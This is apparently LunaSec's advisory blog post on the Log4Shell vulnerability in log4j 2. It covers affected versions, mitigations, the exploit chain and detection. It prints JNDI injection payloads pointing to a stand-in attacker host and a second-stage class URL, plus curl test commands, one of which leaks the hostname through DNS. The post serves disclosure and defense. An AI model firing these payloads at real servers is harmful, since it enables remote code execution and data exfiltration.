<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->
![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-logo.png)

_Originally Posted @ December 9th & Last Updated @ December 19th, 3:37pm PST_

**Fixing Log4Shell? See Our [Updated Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide)
including our automated scanning tool.**

**Also read: Our analysis of [CVE-2021-45046](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046) (a second log4j vulnerability).**

## What is it?
On Thursday, December 9th, a 0-day exploit in the
popular Java logging library log4j (version 2) was discovered that results in Remote Code Execution (RCE), by
logging a certain string.

Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
the impact of this vulnerability is quite severe. We're calling it "Log4Shell" for short.

The 0-day was [tweeted](https://web.archive.org/web/20211211082351/https://twitter.com/P0rZ9/status/1468949890571337731) along with a POC posted on
[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc).  It has now been published as [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/).

This post provides resources to help you understand the vulnerability and how to mitigate it.

<!--truncate-->

_This blog post is also available at https://log4shell.com/_


## Who is impacted?

Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), as well as apps like
Minecraft, have already been found to be vulnerable.

An extensive list of responses from impacted organizations has been compiled [here](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592).

Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like
the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach).

Many Open Source projects
like the Minecraft server, [Paper](https://github.com/PaperMC/Paper/commit/b475c6a683fa34156b964f751985f36a784ca0e0),
have already begun patching their usage of `log4j2`.

Simply [changing an iPhone's name](https://twitter.com/chvancooten/status/1469340927923826691) has been shown to trigger the
vulnerability in Apple's servers.

**Updates (3 hours after posting):**
According to [this blog post](https://www.cnblogs.com/yyhuni/p/15088134.html) (see [translation](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US)),
JDK versions greater than `6u211`, `7u201`, `8u191`, and `11.0.1` are not affected by the LDAP attack vector. In these versions
`com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` meaning JNDI cannot load remote code using LDAP, except in [very
specific cases](https://alex-kiselyov.medium.com/why-trusturlcodebase-may-not-save-you-from-log4j2-ldap-vulnerability-cve-2021-44228-f87b3c1eadaf).
However, there are other attack vectors targeting this vulnerability which can result in RCE. An attacker could still leverage
existing code on the server to execute a payload. An attack targeting the class
`org.apache.naming.factory.BeanFactory`, present on Apache Tomcat servers, is discussed
in [this blog post](https://www.veracode.com/blog/research/exploiting-jndi-injections-java). Also, there are some specific configurations where
a remote JNDI fetch could still take place, as described in [this post](https://alex-kiselyov.medium.com/why-trusturlcodebase-may-not-save-you-from-log4j2-ldap-vulnerability-cve-2021-44228-f87b3c1eadaf).
Please update to the latest version of log4j for a more complete solution.

** Edit: ** To see if you are impacted, you can use our [automatic scanning tool](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).

## Affected Apache log4j Versions

### log4j v2

Almost all versions of log4j version 2 are affected.

`2.0-beta9 <= Apache log4j <= 2.14.1`

:::caution Limited vulnerabilities found in `2.15.0` and `2.16.0`
As of Tuesday, Dec 14, version `2.15.0` was found to still have a possible [vulnerability in some apps](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f). And, a few days later, a DOS vulnerability was found in `2.16.0` too.

~~We recommend updating to `2.16.0` which [disables](https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea) JNDI and [completely removes](https://github.com/apache/logging-log4j2/pull/623) `%m{lookups}`.~~ (Updated: See below)

We recommend updating to `2.17.0` which includes the fixes introduced in `2.16.0` as well as a fix for a [discovered denial
of service (DOS) attack](https://logging.apache.org/log4j/2.x/security.html).
:::
### log4j v1

Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it, you need to
[migrate](https://logging.apache.org/log4j/2.x/manual/migration.html) to `2.17.0`.

## Permanent Mitigation

**For Current Information:** We have written a comprehensive guide on [log4j mitigation strategies](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).

Version `2.17.0` of log4j has been released without the RCE or DOS vulnerabilities. `log4j-core.jar` is available on Maven Central [here](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.17.0/), with [[release notes](https://logging.apache.org/log4j/2.x/changes-report.html#a2.17.0)] and
[[log4j security announcements](https://logging.apache.org/log4j/2.x/security.html)].

The release can also be downloaded from the Apache Log4j [Download](https://logging.apache.org/log4j/2.x/download.html) page.

## Temporary Mitigation

**For Current Information:** Please read our follow-up guide on [log4j mitigation strategies](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).

:::warning `formatMsgNoLookups` Does not protect against all attacks
As of Tuesday, Dec 14, it's been found that this flag is ineffective at stopping certain attacks, which is partially explained in
[CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046).  
You must update to `2.17.0`, or use the JNDI patches for temporary mitigation explained in [our mitigation guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
:::

As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=29507263):

> The 'formatMsgNoLookups' property was added in version 2.10.0, per the JIRA Issue LOG4J2-2109 [1] that proposed it. Therefore the 'formatMsgNoLookups=true' mitigation strategy is available in version 2.10.0 and higher, but is no longer necessary with version 2.15.0, because it then becomes the default behavior [2][3].
>
> If you are using a version older than 2.10.0 and cannot upgrade, your mitigation choices are:
>
> - ~~Modify every logging pattern layout to say `%m{nolookups}` instead of `%m` in your logging
    >   config files. See details at https://issues.apache.org/jira/browse/LOG4J2-2109 This only works on
    >   versions >= 2.7.~~ This is a bad strategy which will likely result in a vulnerability long-term.
>
> - Substitute a non-vulnerable or empty implementation of the
    class org.apache.logging.log4j.core.lookup.JndiLookup, in a way that your classloader uses your
    replacement instead of the vulnerable version of the class. Refer to your application or
    stack's classloading documentation to understand this behavior.

## How the exploit works

### Exploit Requirements

- A server with a vulnerable log4j version (listed above).
- An endpoint with any protocol (HTTP, TCP, etc), that allows an attacker to send the exploit string.
- A log statement that logs out the string from that request.

### Example Vulnerable Code

```ts
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
   * This is pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    String apiVersion = he.getRequestHeader("X-Api-Version");

    // This line triggers the RCE by logging the attacker-controlled HTTP header.
    // The attacker can set their X-Api-Version header to: ${jndi:ldap://some-attacker.com/a}
    log.info("Requested Api Version:{}", apiVersion);

    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

#### Reproducing Locally

If you want to reproduce this vulnerability locally, you can refer to christophetd's [vulnerable app](https://github.com/christophetd/log4shell-vulnerable-app).

In a terminal run:

```shell
docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

And in another:

```shell
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
```

The logs should include an error message indicating that a remote lookup was attempted but failed:

```shell
2021-12-10 17:14:56,207 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1/a]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
```

### Exploit Steps

1. Data from the User gets sent to the server (via any protocol).
2. logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
3. The log4j vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.

Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit
them. The [marshalsec](https://github.com/mbechler/marshalsec) project is one of many that demonstrates generating an
exploit payload that could be used for this vulnerability. You can refer to [this malicious LDAP server](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) for an example of exploitation.

## How to identify vulnerable remote servers

:::info Make sure that you have permission from the owner of the server being penetration tested.
:::

The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above,
the exploit will cause the vulnerable server to attempt to fetch some remote code.  By using the address
of a free online DNS logging tool in the exploit string, we can detect when the vulnerability is triggered.

[CanaryTokens.org](https://canarytokens.org/generate#) is an Open Source web app for this purpose that even generates the exploit string automatically
and sends an email notification when the DNS is queried.  Select `Log4Shell` from the drop-down menu. Then, embed the string
in a request field that you expect the server to log.  This could be in anything from a form
input to an HTTP header.  In our example above, the X-Api-Version header was being logged. This request should trigger it:

```shell
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
```

:::info These requests may not be private
If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
for testing.
:::

## More information

You can follow us on [Twitter](https://twitter.com/LunaSecIO), or subscribe below, and we'll continue to update you as
information about the impact of this exploit becomes available.

We have published a series of posts about Log4Shell on our blog that you might be interested in:
- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**
- **[Explanation of the 2nd Log4j CVE](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)**
- **[Part 1: Log4Shell Live Patch (Background Context)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**
- **[Part 2: Log4Shell Live Patch (Technical Deep-Dive)](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/)**

### Limit your vulnerability to future attacks

[LunaSec](https://www.lunasec.io/docs/pages/overview/introduction/) is an Open Source Application Security framework
that helps [isolate and protect](https://www.lunasec.io/docs/pages/how-it-works/features/) you from 0-day attacks like
Log4Shell.

We also offer a [managed 0-day mitigation service](https://www.lunasec.io/pages/live-dependency-patching) that
automatically and quickly patches your live server's dependencies whenever a new 0-day is announced.

### Stay Updated

For updates on Log4Shell, please follow us on [Twitter](https://twitter.com/LunaSecIO) or subscribe to our newsletter
below.

import ContactForm from '../src/components/ContactForm.jsx'

<ContactForm/>

### Links

- **[Hacker News](https://news.ycombinator.com/item?id=29504755)**
- **[Reddit](https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/)**
- **[Twitter](https://twitter.com/freeqaz/status/1469121757361569793?s=20)**

### Edits

1. Updated the "Who is impacted?" section to include mitigating factors based on JDK version, while also suggesting other exploitation
   methods as still prevalent.
2. ~~Named the vulnerability "LogJam"~~ Added CVE, and added link to release tags.
3. Updated mitigation steps with newer information.
4. Removed the name "LogJam" because it's already been [used](https://en.wikipedia.org/wiki/Logjam_(computer_security)). Using "Log4Shell" instead.
5. Update that 2.15.0 is released.
6. Added the MS Paint logo[4], and updated example code to be slightly more clear (it's not string concatenation).
7. Reported on iPhones being affected by the vulnerability, and included local reproduction code and steps.
8. Updated social info.
9. Updated example code to use Log4j2 syntax.
10. Updated title because of some confusion.
11. Better DNS testing site and explanation
12. Added link to the [Log4Shell Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
13. Add warnings about limited vuln in 2.15 / noMsgFormatLookups
14. Added link to 2nd CVE.
15. Updated contact information.
16. Updated original Twitter link from @P0rZ9 as the original tweet was deleted. Changed from `https://twitter.com/P0rZ9/status/1468949890571337731` to `https://web.archive.org/web/20211209230040/https://twitter.com/P0rZ9/status/1468949890571337731`.
17. Added links to other blog posts.
18. Updated post to include latest version 2.17.0 release.
19. Updated archived Twitter link as the original has no images anymore. Changed from `20211209230040` to `20211211082351`.

### Editing this post

If you have any updates or edits you'd like to make, you can edit this post as Markdown on
[GitHub](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-09-log4j-zero-day.mdx). And please throw us a Star ⭐!

### References

[1] [JIRA LOG4J-2190](https://issues.apache.org/jira/browse/LOG4J2-2109)

[2] [logging-log4j Github](https://github.com/apache/logging-log4j2/pull/607/files)

[3] [JIRA LOG4J-3198](https://issues.apache.org/jira/browse/LOG4J2-3198)

[4] Kudos to [@GossiTheDog](https://twitter.com/GossiTheDog/status/1469252646745874435) for the MS Paint logo!

Also kudos to @80vul for [tweeting](https://twitter.com/80vul/status/1468968891489857537) about this.
